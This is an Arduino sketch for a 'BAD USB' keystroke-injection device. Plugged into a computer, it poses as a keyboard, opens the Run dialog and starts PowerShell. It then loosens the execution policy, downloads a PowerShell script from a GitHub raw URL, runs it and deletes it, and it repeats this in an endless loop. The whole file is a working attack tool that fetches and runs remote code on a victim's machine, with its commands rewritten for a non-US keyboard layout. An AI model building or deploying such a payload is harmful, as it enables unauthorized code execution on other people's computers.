#include <SD.h>                          // Load SD Card Library
#include <SPI.h>                         // Load SD Card Library
#include <Keyboard.h>                    // Load Keyboard Library

int                D1 = 13;
int                D2 =  8;
File myFile ;
#define KEY_DELAY 50 

// ------------------------------------------ const char command [] = "echo hello hackers";
const char command_execute []   = "C>&Util&badscript.ps1";
const char command_delete []    = "rm C>&Util&badscript.ps1";
const char command_download []  = "Invoke/WebRequest /Uri https>&&raw.githubusercontent.com&thoefert/PRIVAT&Stick&main&test.ps1 /OutFile C>&Util&badscript.ps1";
const char command_PSrights []  = "Set/ExecutionPolicz /Scope CurrentUser RemoteSigned";
const char command_Whoami []    = "whoami";

void setup() {
  pinMode(D1, OUTPUT);                        // Initialize the LED_BUILTIN pin as an output
  pinMode(D2,OUTPUT);                         // Initialize the LED_BUILTIN pin as an output
}

// ------------------------------------------ Alert blinking of D1 & D2
void alert_LED(int t) {
  for (int i=0; i <= 3; i++){
    digitalWrite(D1, LOW);                    // Turn the LED on (Note that LOW is the voltage level
    digitalWrite(D2, HIGH);
    delay(t);                                 // Wait for t second
    digitalWrite(D1, HIGH);
    digitalWrite(D2, LOW);                    // Turn the LED off by making the voltage HIGH
    delay(t);
    }                                         // Wait for a second
  digitalWrite(D1, LOW);
  digitalWrite(D2, LOW);                      // Turn the LED off by making the voltage HIGH
  delay(t);                                   // Wait for two seconds (to demonstrate the active low LED)
}

// ------------------------------------------ Status blinking of D2
void status_LED(int t){
  digitalWrite(D1, LOW);
  delay(t);
  digitalWrite(D1, HIGH);
  delay(t);
}
                                              
// ------------------------------------------ BAD USB script to open powershell and type commands
void BAD_USB() {
  alert_LED(100);
                                              //Pressing Win+r shortcut
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(KEY_DELAY);
  Keyboard.releaseAll();
  delay(KEY_DELAY*5);
                                              //Inputting PS command
  Keyboard.println("powershell");
  delay(KEY_DELAY*20);                        //A delay to ensure that cmd window has been started
  Keyboard.println(command_Whoami);  
  delay(500);
                                              //Typing the download command
  Keyboard.println(command_PSrights);
  delay(500);
  Keyboard.println(command_download); 
  delay(500);
  Keyboard.println(command_execute);  
  delay(500);
  Keyboard.println(command_delete); 
  delay(10000);  
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.releaseAll();
  alert_LED(2);
  Keyboard.println("exit"); 
}

// ------------------------------------------ the loop function runs over and over again forever
void loop() {
  //use_SDCARD(10);
  alert_LED(200);
  BAD_USB();

}
